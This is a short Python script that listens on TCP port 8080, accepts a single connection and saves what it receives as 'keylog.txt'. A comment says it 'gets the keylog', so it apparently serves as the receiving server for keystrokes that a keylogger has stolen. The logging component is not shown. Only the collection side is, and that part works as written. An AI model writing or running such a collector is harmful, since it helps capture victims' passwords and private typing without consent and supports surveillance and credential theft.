import socket
######## gets the keylog ########
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()
port = 8080
s.bind((host, port))
s.listen(1)
print (host)
print ("Wating for any connections...")

while True:
    conn, addr = s.accept()
    print (addr, "connected")

    filename = "keylog.txt"
    file = open (filename, 'wb') #writes data as binary
    file_data = conn.recv (1024*1024) #size 1MB
    file.write (file_data)
    file.close()
    print (filename, "has been received")
    quit()
